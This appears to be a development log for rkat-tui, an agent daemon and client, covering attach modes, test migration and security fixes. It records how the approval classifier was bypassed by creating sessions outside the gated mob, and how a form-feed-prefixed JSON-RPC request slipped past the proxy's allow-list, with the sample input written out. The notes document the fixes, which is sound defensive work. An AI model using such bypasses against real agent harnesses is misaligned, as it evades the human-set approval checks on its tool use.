host and a port 1–65535, split at the last `:` so `[::1]:4100` works);
anything else is a usage error that names the grammar. The `=` stays
required (`require_equals`), so `rkat-tui --attach ../x` is a prompt.
`AttachMode` (start the daemon or not) is what the target implies
(`AttachTarget::mode`: only `auto` starts one). `--attach-token-file` is
not forwarded to a started daemon and the daemon refuses it
(`DaemonCli::check`); `launch::NOT_FORWARDED` lists it so
`every_engine_flag_reaches_the_daemon` keeps covering every other flag.

A directory is resolved as the client resolves its own workspace
(`bootstrap::scope::workspace_at`: the nearest ancestor holding
`.rkat/tui/`, else the directory, canonical); the workspace the daemon
wrote into its endpoint file wins when one is there
(`client::directory_args`). The client then runs on that workspace as if
started there (`-w` replaced): its scope is the daemon's workspace, so
the `!` shell's directory, `@` expansion, `/export`, `/remember`,
`/memory` and the histories need no special case. A directory with no
endpoint file is refused before the TUI opens (`TuiError::NoDaemonAt`)
and before its state directory would be created. Tests:
`cli::tests::attach_values_follow_the_grammar_and_no_attach_is_in_process`,
`attach::attach_to_a_directory_resolves_locally_against_its_workspace`
(two workspaces; `pwd` from `!` and an `@` mention resolve in the
daemon's).

### The attach is answered after the client is counted

CI failure on fbb1ec3: `lifecycle::status_reports_the_daemon_its_clients_and_the_owner`
saw 2 clients right after the third attach had completed. Maintainer
review found the order: `handshake::accept` wrote and flushed
`{attached: true}`, and only then did `serve::connection` take the
lifecycle seat, so a client could finish its attach while other
connections still read the old count. The handshake is split
(`handshake::read_attach` checks the line and answers refusals,
`handshake::acknowledge` writes the answer) and `serve::admit` takes the
seat (clients, owner, probe) between the two; when the answer cannot be
written the seat is withdrawn (`Seat::withdraw`: uncounted, and no
detach, since that client never learned it attached), and otherwise it
lives until the connection ends as before. Tests, deterministic (no
polling): `daemon::serve::tests::the_client_is_counted_before_its_attach_is_acknowledged`
(the writer records the count at the moment the answer is written),
`daemon::serve::tests::a_failed_acknowledgement_gives_the_seat_up_without_a_detach`,
`lifecycle::an_answered_attach_is_counted_for_every_other_connection_at_once`
(seven attaches, each followed at once by another connection's
`rkat/status`).

### `--attach=HOST:PORT` with a token file

The daemon keeps binding loopback (the token is the only access control
and a non-loopback bind would expose it to the network); reaching one on
another machine is the user's tunnel (`ssh -L`). `client::address::reach`
reads `--attach-token-file` (refused when any group or other permission
bit is set, `mode & 0o077`: a review found the first version masked only
`0o007`, so a `0640` or `0620` token passed although a group member could
read or replace it; `the_token_file_is_refused_when_others_can_read_it`
now checks `0644`, `0640`, `0620`, `0604`, `0602`; the file may hold the token alone or be a copy of
the endpoint file), resolves `HOST:PORT`, attaches as a probe and reads
`rkat/status`. `Status` gained `host` (`nix::unistd::gethostname`, the
`hostname` feature of `nix`; absent from older daemons). The workspace is
local only when an endpoint file on this machine (`daemon::list::files`)
names the daemon by the token presented, for the workspace its status
reports, and the directory exists (`address::remote_reason`). The first
version took a matching host name plus an existing directory as local; a
review pointed out two machines can share both, and the tunnel attachment
would then run `!`, expand `@` mentions from the client's copy and write
`/remember` notes into the wrong tree. The host name now only words the
reason. Tests: `client::address::tests::a_daemon_is_local_only_when_an_endpoint_file_here_names_it`
(identical host and path without a record is remote; another token or
workspace in the record is remote) and `attach::attach_by_address_with_a_token_file`,
which no longer sets `remote` by hand: it reaches the daemon through
`client::configure_at` with and without the daemon's endpoint file as
this machine's record. Then the client runs on it as a directory
attach does. Otherwise it keeps its own scope (history, cost record,
`/export`'s default place) and `AttachConfig::remote` holds the reason:
the attach runner refuses `!` (as a failed shell run), `/remember`,
`/memory` and `/export <path>` with it, and sends `@` mentions as typed
with a notice. A daemon reached by address is always attached at that
address (`AttachConfig::address`; reconnects retry it with backoff, never
probe endpoint files nor start a daemon), `/daemon stop` sends
`rkat/shutdown` instead of SIGTERM to a pid that may be another
machine's, and `daemon_ended` ignores the pid for a remote daemon and
takes no endpoint files as no evidence (it had counted an empty list as
"every file gone"). Through a tunnel the local port may accept while the
daemon is gone, so an unconfirmed shutdown there is reported as possibly
still running. A review found the converse too: a refused connect to the
local port was still taken as the daemon's end, but when the `ssh -L`
forward exits during an unanswered `rkat/shutdown` the port refuses while
the remote daemon runs on. `daemon_ended` now takes `direct`
(`AttachConfig::address` unset) and only then counts the pid or a refused
connect; by address only the endpoint files count (none for a remote
daemon), so the shutdown stays unconfirmed unless the daemon acknowledged
it. Test: `client::runner::tests::a_dropped_tunnel_leaves_an_unanswered_shutdown_unconfirmed`
(remote and local-by-address, port refused, pid alive: "may still be
running"; the file gone: stopped). Tests:
`attach::attach_by_address_with_a_token_file` (a test daemon on a
loopback port reached by address: local case, then the refusals with
`remote` set), `attach::attach_by_address_refuses_a_readable_or_missing_token_file`,
`client::address::tests::*` (locality, token file modes and forms).

### The endpoint key includes the realm (P4)

The endpoint file's key was the SHA-256 of the canonical workspace path
alone, so a daemon started with `--isolated` or `--realm-backend memory`
took the workspace's ordinary endpoint file and a later plain
`rkat-tui` in that workspace attached to the throwaway realm.
`daemon::endpoint::RealmKey` names the realm a scope resolved to: the
workspace's own (`<workspace>/.rkat/tui`, no memory backend) keeps the
old key, any other realm adds a NUL and `realm:<canonical root>` to the
hash, a memory realm `memory:<root>`. The endpoint file records the realm
(`realm`, absent for the workspace's own) and `--list` shows it after the
workspace. `--isolated` mints a fresh realm id at every resolution, so a
client that starts its daemon passes `--realm <id> --state-root <root>`
of the realm it minted instead of `--isolated` again
(`client::launch::pin_realm`); otherwise it would wait at one key while
the daemon wrote another. `--attach=DIRECTORY` looks for the directory's
own realm. Tests: `daemon::endpoint::tests::the_key_tells_the_workspace_realm_from_isolated_and_memory_ones`,
`daemon::endpoint::tests::an_isolated_client_pins_its_realm_for_the_daemon`,
`daemon::list::tests::a_line_never_holds_the_token_and_keeps_its_column_order`
(the realm suffix).

### Sessions created before the daemon are view only (P4)

P3's probe stands (`missing durable comms_name for resumed mob member`;
mob-owned transcripts cannot be edited, so no copy into a fresh member
session either): a session the in-process TUI created cannot become a
daemon conversation. With the in-process runner going away, such
sessions are shown instead of resumed. `Conversations::list` appends
`Conversations::earlier`: the realm's sessions (`SessionService::list`,
which leaves archived ones out) not in `conversations.json` whose durable
metadata (`MobSessionService::load_persisted_session_metadata`) has no
`comms_name`, i.e. no mob member's (helpers, the orchestrator and any
member of an older in-process mob have one; a session whose metadata
cannot be read is left out), most recently updated first, as
`Listed { view_only: true }`. The client's picker marks them
(`sessions::VIEW_ONLY`); `last`/`~N` skip them; resolving to one reads
its transcript (`rkat/transcript`, which reads any session of the realm)
into `Report::Viewed`, which resets the transcript, shows
`sessions::view_only_notice` and remembers it (`AttachRunner::viewing`).
`/export` names the file after the viewed session; `/resume <current>`
while viewing re-renders the conversation (`adopt`), and every adoption
clears the view. The notice names the current conversation by its full
id: session ids are UUIDv7, so two created minutes apart share their
first eight digits and a short prefix is ambiguous.

Engine ask (recorded as ask 7 in `docs/mob-split.md`): a way to seat a
mob member on an existing non-member session, or to write the durable
`comms_name` and member binding when seating one, so a consumer can adopt
sessions created outside the mob. Tests:
`conversations::an_in_process_session_cannot_be_seated_on_the_member`
(listed view only with its title, `--resume <it>` shows it with the
notice, `/export`, the next prompt runs on the conversation, `/resume
<current>` shows it again; the engine's refusal stays pinned),
`client::sessions::tests::earlier_sessions_are_marked_and_named_by_id_only`.

### P4: the in-process tests and where they went

The in-process runner is deleted in P4; its headless tests (`Rig` in
`tests/common/mod.rs`) move onto the daemon rig (`tests/common/rig.rs`:
`Running`, `Client`), one file per commit, keeping every behaviour
assertion. A test of a mechanism that exists only in-process is deleted
and listed here.

- `tests/fork.rs`, deleted with `src/fork/` (the TUI's `fork` tool, which
  rendered the conversation into a `delegate`-style helper's prompt
  because the engine refuses `fork_off` to a non-member caller). In the
  daemon the agent is a mob member and forks with the engine's
  `fork_off`, pinned by `approvals::a_fork_off_child_runs_behind_the_gate`.
  `a_fork_starts_with_the_parents_conversation_and_returns_its_answer`,
  `a_forks_calls_pass_the_parents_gate`, `an_interrupt_leaves_no_running_fork`
  and `fork_off_stays_denied_and_a_fork_cannot_fork` tested the tool
  itself; `the_engine_refuses_a_durable_fork_of_a_running_session` probed
  why the tool existed. `ToolFamily::Fork` and the `fork` entry of
  `DELEGATION_TOOLS` went with it (`policy::tests::fork_is_tiered_like_delegate_only_from_the_tuis_own_surface`
  deleted).
- `tests/compact.rs`: both tests (`auto_mode_compacts_natively_at_the_threshold`,
  `warn_mode_warns_and_compacts_only_on_compact`) run over the daemon
  harness (`tests/common/rig.rs`: `Setup`, `Attached`, which the later
  files use too) with every assertion kept; the policy is read from the
  same `tui.toml` layers the daemon reads. The migration found a parity
  gap: the daemon never gave its orchestrator the `[auto]` compaction
  policy (the in-process runner set the build's
  `auto_compact_threshold_override`), so `auto.compact = "auto"` did not
  compact by size in the daemon. The orchestrator's profile now carries
  `auto_compact_threshold` (`RootPlan::compact_threshold`, the policy's
  trigger for the start-up model's window: none in native mode, the
  tokens in auto mode, the largest threshold in warn mode). The mob keeps
  the definition it was created with, so a policy changed later reaches
  the orchestrator only once its mob is created again; the engine has no
  route to update a profile of a live mob.
- `tests/semantic_recall.rs`: both tests run over the daemon harness,
  assertions kept. `every_offered_builtin_is_classified_and_memory_search_is_tier_one`
  now checks the tools the daemon's orchestrator is offered, and found
  the member-scoped mob tools a daemon member gets (`list_members`,
  `member_status`, `spawn_member`, `spawn_many_members`, `retire_member`,
  `wire_members`, `unwire_members`, `force_cancel_member`) in neither
  list: the two queries are now `READ_ONLY_BUILTINS` (tier 1), the rest
  `REVIEWED_BUILTINS` (the classifier, as they already fell to as
  unlisted tools).
- `tests/instructions.rs`: the three tests run over the daemon harness.
  `a_resumed_session_keeps_its_instructions_and_the_persona_once`
  resumed by `--resume last` in-process; the daemon's resume of the same
  kind is its restart on the orchestrator's conversation, so the test
  restarts the daemon and asserts the same conversation, the persona
  once, the first file's rules and not the edited ones, then the edited
  rules in a `/new` conversation. Its comparison of the persisted
  `build_state().additional_instructions` before and after was the
  in-process mechanism (a session loaded through the service), which the
  wire does not expose; the prompt assertions that show its effect stay.
- `tests/models.rs`: the four tests run over the daemon harness; a resume
  (`--resume last` in-process) is the daemon's restart on the
  orchestrator's conversation, and the session's stored identity is read
  from the realm's store (`rig::stored_session`). The migration found
  three gaps, fixed here:
  1. `/model` to a model only an endpoint lists (`proxy:my-alias`) was
     refused by the daemon ("no capability profile is registered"): the
     in-process switch wrote the model's profile into the realm config
     first. `rkat/set_model` now takes what the client's list says of the
     model (`SetModelParams::listed`: window and output limit) and writes
     the profile (`endpoints::ensure_model_profile`). The engine captures
     the agent's model registry at build ("absent from the agent's
     effective model registry" otherwise), so when the profile is new the
     daemon seats the orchestrator again on its session
     (`Conversations::reseat`, after `await_removed_actor_exit` of the
     retired actor) before the switch, and answers `reseated`; the client
     then reopens the conversation's stream (`Again::Reseated`, keeping
     the running turn and dialogs) and holds prompts typed meanwhile
     (prompts are held during every conversation switch now, not only at
     start-up). The status bar's context window falls back to the
     client's model lists when its realm config predates the profile.
  2. After a daemon restart the status bar named the provider
     (`anthropic`) instead of the configured endpoint the session's
     binding names (`proxy`), which the in-process resume derived from
     the binding. New local method `rkat/endpoint` (the binding's
     endpoint from the session's durable metadata); the client asks it on
     attach and after every adoption.
  3. The attach `/model` refusal lacked the in-process "model not
     changed:" prefix.
  Two engine facts, triaged by the engine maintainers on 2026-11-09:
  1. Opening the realm persistence a second time in the daemon's process
     (`stored_session` while it runs) is an engine defect: the same
     database path rebinds the shared authority bundle to one weak
     reference, so dropping the newer handle strands the earlier
     machine's auth operations (the daemon's next binding rotation fails
     with "runtime store is no longer available"). A fix is in progress
     upstream. Until it ships, the rule is one store handle per realm per
     process: the daemon opens its realm once, and tests read the store
     only between daemon runs. **Fixed in 0.9.12** (lukacf/meerkat#2149:
     the auth authority uses the newest still-open handle); the rule is
     dropped. The daemon keeps its single handle, and `rig::stored_session`
     reading beside a running daemon is now sound.
  2. A compaction or an in-place model change on a cold session (right
     after a daemon restart, before the restored orchestrator's first run)
     does not wake it, by design; the engine's "Runtime not ready:
     destroyed" refusal is to become a typed not-registered refusal
     upstream. The supported path is to run a turn first, which the test
     does and the manual's limits say; rkat-tui adds no implicit wake.
- `tests/approval_service.rs`: the eight tests run over the daemon
  harness with the shared `rig::ScriptedClassifier` (one double for every
  file: replays verdicts, records `(tool, args, transcript)`, fails or
  allows when the script runs out). The added rule is read with
  `rkat/rules list`; the reseed test restarts the daemon and asserts the
  seeded words on the transcript the classifier was shown (the engine's
  transcript map is not on the wire). Two gaps found and fixed:
  1. The daemon dropped the approval engine's events ("nobody renders
     them"), so attach mode showed no classifier-allow note under a tool
     block, no line for a block or a human's answer, no auto-mode pause
     notice, no classifying indicator and no classifier usage in `/cost`.
     They now go to every client as `rkat/approval_note`
     (`protocol::ApprovalNote`, pushed through the consent surface's
     client list, `Decisions::broadcast`), and the client renders them as
     the in-process runner did (`client::approvals::note_messages`,
     re-reading the mode status after a decision or a pause).
  2. A conversation the daemon restored at start, or one `/resume`
     switched to, had an empty classifier transcript: the in-process
     resume seeded it from the session's history. The daemon now seeds it
     (`Conversations::seed`, `ApprovalEngine::seed_transcript` over the
     stored session) on restore and after every `/resume`.
- `tests/client_turns.rs`: 21 of its 30 tests run over the daemon harness
  with their assertions; `-c`, `--resume <prefix>` and `--resume` alone
  are the client's arguments (`Setup::client_args`) against a restarted
  daemon, and a stored identity is read with `rig::stored_session`.
  Re-expressed: `status_report_names_the_session_and_the_workspace`
  asserts the attach `/status` (session, workspace, the daemon, the
  approval gate); the in-process lines for shell confinement, permission
  mode, the `tui.toml` and `mcp.toml` files and helpers were not in the
  attach report (closed in P4b by `rkat/report`, see "`/status` reads the
  daemon's side");
  `context_report_describes_the_session` asserts the attach line for the
  TUI's tools. The migration found that attach mode sent a prompt
  repeated after a failed turn as a second copy: the client now sends
  "(retrying the request above)" with the in-process notice when the
  failed prompt is still the conversation's last message
  (`AttachRunner::retry_input`). Deleted, with what covers them now:
  - `new_and_resume_switch_sessions_in_process` →
    `conversations::new_starts_fresh_and_resume_brings_the_old_conversation_back`
    (its `resolve_session_ref(.., "last")` check was the in-process
    listing; the daemon's references are `client::sessions::resolve`,
    unit-tested);
  - `each_open_of_a_realm_holds_its_own_lease_until_released` (two
    in-process bootstraps of one realm; one daemon holds the realm, pinned
    by `daemon::a_second_daemon_on_a_live_workspace_is_refused`, and
    `quitting_releases_the_realm_lease` now stops a daemon);
  - `references_resolve_over_the_service_listing` (`session::resolve`,
    deleted with `src/session/`) → `client::sessions::tests::*`;
  - `rewind_forks_before_the_chosen_message_and_keeps_the_old_session` →
    `conversations::rewind_says_why_it_is_not_offered` (the engine
    refuses a member's transcript fork, ask 1);
  - `interrupt_cancels_the_running_turn_and_returns_steers`,
    `interrupting_a_slow_tool_returns_the_messages_typed_meanwhile`,
    `esc_interrupts_and_the_queued_message_runs_next`,
    `recalling_a_message_typed_during_a_slow_tool_leaves_the_run_alone`,
    `recalling_a_steer_that_already_joined_the_run_leaves_it_delivered`:
    they asserted that a steer sent into a running turn comes back on Esc
    or recall, the in-process runner's cancel of its own runtime input.
    `mob/member_send` answers no input id to cancel by (ask 6): in the
    daemon a sent steer is the runtime's, marked delivered when the turn
    ends, and recall says so (`attach::what_the_daemon_cannot_do_yet_says_so`);
    the interrupt itself is `attach::esc_interrupts_a_hanging_turn`. A
    probe while re-expressing them saw the runtime run the steers after
    the interrupted run (a follow-up run consumed the next scripted
    answer); that is the manual's documented limit ("the agent gets it at
    its next step") and stays until ask 6 ships.
- The adoption test of the lukacf/meerkat#2102 fix moved onto the daemon:
  `helpers::a_helper_delegated_after_a_model_switch_runs_on_the_new_model`
  (a `/model` switch through `rkat/set_model`, then the orchestrator's
  `delegate`: the helper's model call and its stored session are on the
  switched model). Its in-process twin in `tests/mobs.rs` goes with that
  file's migration.
- `tests/mobs.rs`: seven of its nine tests run over the daemon harness
  with their assertions. The helper host's internals the in-process tests
  read (`Helpers::state()`, `registry()`, the engine) are the daemon's
  own mob host, helper registry and approval engine, reached through
  test-support accessors (`Daemon::mob_state`, `helper_registry`,
  `approval_engine`; `rig::Running::{state, registry, engine}`). A
  configured endpoint's helper reads its stored binding with
  `rig::stored_session` after the daemon stops; the restart test stops
  the daemon and starts a new one on the realm (the orchestrator is
  restored there, so the owner is the open session; "open or not" holds
  for the forget step). The depth tests also count `spawn_member` and
  `spawn_many_members`, which a daemon member is offered. Deleted:
  `an_interrupt_leaves_no_running_helper` →
  `helpers::esc_during_a_helper_stops_the_orchestrator_and_the_helper`
  (the mob's members listed empty over `mob/members`), and the in-process
  twin of the #2102 adoption test
  (`helpers::a_helper_delegated_after_a_model_switch_runs_on_the_new_model`).
  The migration found that the daemon never installed the approval
  engine's forget hook the in-process host had (`Helpers::start`), so
  `ApprovalEngine::forget_session` left the forgotten session's helpers in
  the registry; the daemon's composition installs it now. It also
  showed that nothing in the daemon calls `forget_session` when a
  conversation switch leaves a session (in-process, closing the session
  did): the left conversation's per-session gate state (classifier
  transcript, allow cache) stays in memory until the daemon exits, which
  is harmless for correctness (a `/resume` seeds the transcript again) and
  is left as a known gap.
- `tests/confinement.rs`: all eight tests run over the daemon harness with
  their assertions (the confined shell is the daemon's; the `!` command
  runs in the attached client, under the confinement plan the client
  builds from the same layers). Two rig seams: `Setup::host_paths` now
  reaches the client's `!` shell as well (`Client::attach_setup`; the
  client otherwise confines `!` with this host's detected paths, which
  grant the temp dir the tests' outside directory lives in), and
  `Setup::endpoint_file` moves the endpoint file out of the temp dir for
  the two tests that run with the host's real paths: their shell is
  granted the temp dir, and the daemon refuses an endpoint file its shell
  could read (`DaemonError::EndpointExposed`), as it should. A start-up
  refusal is `DaemonError::Bootstrap` around the same typed
  `TuiError::Confinement` (`Attached::try_start_with`).
- `tests/client.rs`: `both_runners_build_the_same_app_for_the_same_config`
  lost its purpose with one runner (it compared the in-process setup with
  the client's); it is now `the_client_builds_its_app_from_the_config`,
  asserting that the `[ui]`, `[auto]` and confinement settings reach the
  client's setup and its app. `attach_mode_recalls_and_searches_the_shared_input_history`
  compared the history files with an in-process bootstrap's; it compares
  them with the scope `bootstrap::read_layers` resolves (the daemon's own
  resolution), assertions otherwise kept.
- `tests/conversations.rs`: the P3 probe created its pre-daemon session
  with the in-process `Rig`. It is now
  `a_session_outside_the_mob_cannot_be_seated_on_the_member` and creates
  the session with the engine's own `session/create` over the daemon's
  wire: a plain session in the realm with no durable `comms_name`, which
  is what made an in-process session view only. No library seam was
  needed; every assertion (listed view only and titled, the transcript
  shown, the notice, `/export`, the agent staying on its conversation, the
  engine's "missing durable comms_name" refusal) is kept. A probe found
  that a session a client creates that way does not run behind the
  approval gate: its scripted `shell` call ran with the classifier never
  asked. The daemon proxies every engine method to an authenticated
  connection (the endpoint token, which the confined shell cannot read),
  and rkat-tui's client never calls `session/create`, so only a token
  holder can do this; it is still a gap in depth, left open (refusing the
  engine's session-creating methods in the proxy, or gating every session
  the factory builds, are the candidate fixes).

### The daemon's stop waits for the realm's databases to close

The hosted run of 983bb44 failed `client_turns::workspace_state_survives_a_rename`
with `NotFound` in `copy_tree`: a file the walk listed vanished before it
was copied, right after the rig's quit. Root cause, by probe (snapshotting
the workspace every 25 ms after quit): `Daemon::serve_until` returned with
every one of its own handles dropped (the runtime's and the mob state's
strong counts were 0), yet `sessions.sqlite3-wal` and `-shm` were removed
about 260 ms later, consistently. The engine's schedule store runs its
connection on a worker thread that closes it at a 250 ms idle bound
(`SCHEDULE_CONNECTION_IDLE_TIMEOUT` in meerkat-store), and that last close
removes the write-ahead log and shared memory. So the realm tree was still
changing after quit returned. The fix waits instead of tolerating: the
daemon's shutdown joins the tasks it aborts, then waits (at most 3 s) until
`/proc/self/fd` shows no database file of the realm open
(`daemon::settle_stores`; pinned by
`daemon::tests::the_shutdown_waits_for_the_realms_open_databases`, whose
open file is never taken as closed). After it the probe saw no change in
the tree in the second after quit. A `-wal` file is not the evidence:
`workgraph.sqlite3-wal` and `mobs/mob--tui.db-wal` stay on disk with no
descriptor open. Where descriptors cannot be listed (not Linux) nothing is
waited for and nothing is claimed; past the bound the daemon logs that the
databases may still be open. `copy_tree` stays strict and now names the
file that vanished. The custody lock files
(`sessions.sqlite3.execution-custody`, `mob--tui.db.incarnation-custody`,
`tool_process_custody/.incarnations/*.lock`) stay open in the process after
the stop; they are locks, never removed by a close, so they do not race a
copy.

### The daemon's proxy serves an allow-list of engine methods

The maintainer's review of ba3d1fc: the application gate is attached in
`daemon::engine::compose` to the mob's root member and, through the
spawn customizer, to every member and helper the mob state seats; a
session the `SessionRuntime` builds any other way gets no
`ToolDispatchAdmission`. `daemon::serve::proxy` forwarded every engine
method to an authenticated connection, so a client holding the endpoint
token could `session/create` a plain session whose `shell` call ran with
the classifier never asked (the probe). The fix keeps the invariant at
the one door: `protocol::engine::SERVED` lists the engine methods the
client calls (the `mob/*` member and stream methods, `events/*`,
`session/compact`, `initialize`) plus two read-only inspections
(`decision/get`, `approval/list`); `serve::route` answers anything else
with `protocol::NOT_SERVED` (`-32012`, rkat-tui's own code so a client can
tell the proxy's refusal from the engine's `METHOD_NOT_FOUND`) and drops a
notification. `decision/decide` and `rkat/*` stay the daemon's own.
Pinned by `approvals::engine_methods_that_make_sessions_outside_the_mob_are_refused`
(`session/create`, `turn/start`, `session/fork_at`, `mob/create`,
`mob/spawn` refused over the raw wire, no model call made, no command
run, `mob/members` still answered); the attach tests cover the
conversations, `/new`, `/resume`, helpers and `fork_off`. Tests that need
the engine past the proxy (a plain session for the view-only listing, the
engine's own `session/fork_at` refusal) use the test-support
`Daemon::engine_side`, which holds the runtime weakly.

### The proxy forwards only what it parsed

The maintainer's source review of e7314db: `serve::route` parsed
`line.trim_end()` with `serde_json` and, when that failed (or the value
named no method), forwarded the client's original line to the engine,
on the reasoning that the engine would answer it with its own parse
error. The engine's frame parser (`meerkat-rpc` 0.9.11,
`transport.rs`, `parse_rpc_message_frame`) parses `line.trim()`, which
also strips Unicode whitespace (a form feed, U+000C, among it) that JSON
does not count as whitespace. So `\x0c{"jsonrpc":"2.0","id":1,"method":"session/create",…}`
failed the proxy's parse, took the raw-forward branch, and became a
valid request on the engine's side, never meeting
`protocol::engine::SERVED`: the allow-list above was bypassed by a parser
differential. The rule now: the proxy forwards only what it parsed.
`route` validates the envelope itself (an object, `jsonrpc` "2.0",
`method` a string, `id` absent, a string or an integer); a parse failure
is answered with `PARSE_ERROR` (id null), an envelope it refuses with
`INVALID_REQUEST` under the request's id (dropped when there is none),
a blank line is dropped, and none of them is forwarded
(`Routed::Malformed`). A served request goes on as the proxy's own
serialization of the parsed value, so the engine never sees bytes the
proxy did not judge (duplicate keys collapse to the one the proxy read).
The client sends no responses to the engine, so refusing methodless
objects costs nothing. Pinned by
`daemon::the_proxy_forwards_only_requests_it_parsed`: the form-feed
variants of a refused `session/create` and of a served `mob/members`
both get the proxy's parse error, the well-formed `session/create`
keeps `NOT_SERVED` (the control), methodless, wrong-version and
array-id envelopes are invalid requests, no model call is made and the
shell marker is absent, and `mob/members` still answers afterwards.

### Engine-property tests left upstream

The senior review of 55f89b4 found three tests whose halves tested the
engine rather than this crate's wiring. Each keeps the assertion that
pins rkat-tui's wiring; the dropped halves are covered by the engine's
own tests, which landed with the fixes (lukacf/meerkat #2100, #2104,
#2105 and the 0.9.11 integration #2124; read in the registry source
under `~/.cargo/registry/src/*/meerkat-*-0.9.11/tests/`):

- `tests/hook_source_trust.rs`: kept
  `a_hook_written_between_the_guard_and_the_build_never_runs` with the
  trust installed (rkat-tui's `ProjectInputs` refuses the planted hook)
  and the cases that judge rkat-tui's record (`--trust-project`, the
  user file, a file untrusted before the build). Dropped its control
  without a trust, covered by `meerkat` `tests/hook_source_trust.rs`
  `without_a_trust_the_project_hooks_run_as_before`, and
  `a_hook_the_user_file_states_identically_survives_the_refusal`, covered
  by `an_identical_user_entry_runs_from_an_untrusted_project` there
  (the engine decides identity; the differing-definition half is the
  same engine comparison).
- `tests/confinement.rs`: `workspace_mode_resolves_localhost_and_dns_names`
  became `workspace_mode_resolves_localhost`: `localhost` resolves, so
  rkat-tui's plan grants `/etc/hosts` and `/etc/nsswitch.conf`. DNS
  through a granted or linked `/etc/resolv.conf` is the sandbox's,
  covered by `meerkat-sandbox` `tests/process_confinement.rs`
  `linux_resolves_a_host_name_through_a_symlinked_resolv_conf` (an
  `#[ignore]` positive lane upstream runs on eligible hosts).
- `tests/semantic_recall.rs`: `a_compacted_fact_is_found_with_memory_search`
  keeps the wiring: under rkat-tui's `[auto]` compaction settings a fact
  from compacted history is found by `memory_search`, so the daemon
  wires the memory store compaction indexes into and the tool reads. It
  no longer asserts the engine's part, that compaction started and the
  compacted request lost the fact; `meerkat`
  `tests/compaction_ownership_gaps.rs` (`compact_during_run_n`, the setup its tests share) asserts
  the compaction, its committed summary and the discarded history as a
  finalized compaction memory record.

The migration to the daemon rig had removed none of them.

### The changelog keeps what a user sees

`CHANGELOG.md` was cut into `[0.1.0] - 2026-11-08` (the state before the
daemon work: the changelog as of 79ca814^) and `[Unreleased]` (the
daemon and what came with it, rewritten as the change from 0.1.0, so
features added and removed again since, such as `--no-attach`'s alongside
dialog or the attach-mode catch-up fixes, are not listed). The engine
pin moves are one line each section. The mechanics the old entries
carried are recorded here instead: `MeerkatMachine::request_compaction`
for `/compact` ("Superseded (2026-11-09, by `request_compaction` …)"
under "Esc, queued messages and commands to match Claude Code", and "P6"
gap 1), the `ConfigRuntime` writes and the admission fence (`set_held` /
`patch_held`, "The pin moves to the 0.9.11 integration", and "Reusing
the engine's owners", item 3), `SessionService::list` (same section,
item 2) and the removal of the implicit-mob customizer
(`mobs::endpoint_models`, "P5 — Mobs", superseded upstream).

### P4: the in-process runner is deleted

`src/runner/`, `src/session/`, `src/client/alongside.rs` and the
in-process half of `src/bootstrap/` (`Runtime`, `bootstrap`,
`bootstrap_with`, the `TuiService` composition, `start_helpers`) are gone,
with `--no-attach`, `Args::attach_mode`, `bootstrap::attach_mode`, the
alongside dialog (`ui::ask_alongside`, `AlongsideDialog`) and
`TuiError::RunningInDaemon`; `lib::run` always runs `client::run` on
`Args::attach_target` (`--attach`, else `auto`). `tests/common/mod.rs`
keeps the workspace, the scripted LLM and the command lines; `Rig` is
gone, and the daemon rig (`tests/common/rig.rs`) is the only one.
What moved first (305cea2): `TUI_OWNED_BUILTINS` to `approval::policy`,
`DENIED_SPAWN_TOOLS` and the members' `tool_access_policy` to
`mobs::customizer`, `AdmissionError` to `error.rs`, `blocks_from_messages`
to `ui::transcript`. `workbench::AgentContext` is a plain type over the
client's connection (`mob/append_system_context`), no trait.

The default-features clippy lane named everything only the in-process
runner reached, and it is deleted rather than kept for tests:
`mobs::Helpers` (the in-process helper host; the daemon composes the same
customizer, registry and hooks itself), `approval::ServiceToolOrigins`,
`admission::install`, `ApprovalEngine::forget_user_input` and
`resume_auto` (attach `/auto resume` is `rkat/set_mode auto`, which
clears a pause the same way), the transcript's `forget_user_input`,
`HelperUpdate::{Live, Unmeasured}`, the UI's `TurnFailure::{Unknown,
Pending}`, `StatusUpdate::ApproxContextWindow`, `Msg::{SteerRequeued,
HelperUnmeasured}`, `SessionCost::{derived, reconcile, mark_unmeasured}`,
`HelperState::Unmeasured`, `workbench::tasks::read_checklist`, and the
`/rewind` menu (`ui/rewind.rs`, `Modal::Rewind`, `Msg::{ShowRewindMenu,
Rewound}`, `Effect::Rewind`, `Transcript::cut_before_user`): the daemon
has no rewind (ask 1, lukacf/meerkat#2126), so `/rewind` keeps only its
"not available" answer (`client::sessions::REWIND_UNAVAILABLE`). Tests of
those mechanisms went with them (`lifecycle::no_attach_beside_a_live_daemon_says_so_and_explains_its_conversation`,
`ui::modal::tests::the_alongside_dialog_offers_attach_alongside_and_stop`,
the rewind menu and rewound tests, `requeued_delivery_returns_to_waiting`,
`an_unmeasured_helper_marks_the_cost_a_lower_bound`,
`a_helper_that_cannot_be_followed_is_reported_unmeasured`,
`derived_totals_are_approximate`); the ones whose other assertions still
apply were rewritten around them (`transitions_keep_the_placeholder_in_step`,
`a_compaction_counts_its_estimate_and_makes_the_cost_approximate`,
`recording_a_key_twice_is_idempotent_and_the_same_text_twice_is_not`,
`rewind_hint_snapshot`, `the_daemon_is_the_default_and_a_tui_toml_attach_key_is_ignored_with_a_notice`).

The `forget_session` the in-process session called on close had no
caller left: the daemon now forgets the gate's state of the conversation
`/new` or `/resume` leaves (`Local::switch`; its classifier transcript,
allow cache and, through the forget hook, its helpers), and a `/resume`
seeds the transcript again, pinned in
`conversations::new_starts_fresh_and_resume_brings_the_old_conversation_back`
(the transcript is there, gone after `/new`, back after `/resume`). This
closes the gap the `tests/mobs.rs` entry recorded.

### `/status` reads the daemon's side (`rkat/report`)

The in-process `/status` named the realm, the shell's confinement, the
permission mode with its denial counters, the realm rules file's trust,
each project input's trust ("trusted for this run" under
`--trust-project`) and the helpers' depth limit, all read from the
in-process runtime. In the daemon they are the daemon's: new local method
`rkat/report` (`protocol::Report`; `Local::report`) answers them from the
daemon's approval engine (`ModeStatus::of`), its project inputs (which
share the trust record the realm rules are judged by, so the rules file's
trust is `ProjectInputs::status` of it) and `local::ReportParts` (the
realm, the confinement mode `--confinement` chose, `[helpers]
max_depth`). The client appends them to its own lines
(`client::runner::report_lines`, unit-tested with the old report's
wording) and says "the daemon's side is unknown" when the call fails,
rather than leaving the lines out silently. Pinned end to end by
`client_turns::status_report_names_the_session_and_the_workspace`.

## P5: several agents per workspace (2026-11-10)

The daemon hosts several orchestrator members in its mob `tui`, one per
agent a user works with (`docs/mob-split.md`, "P5"); the decisions are the
user's (names, always wired, start semantics, `/quit` retires, `/detach`
keeps the agent live).

### The member set, its names and the conversation log

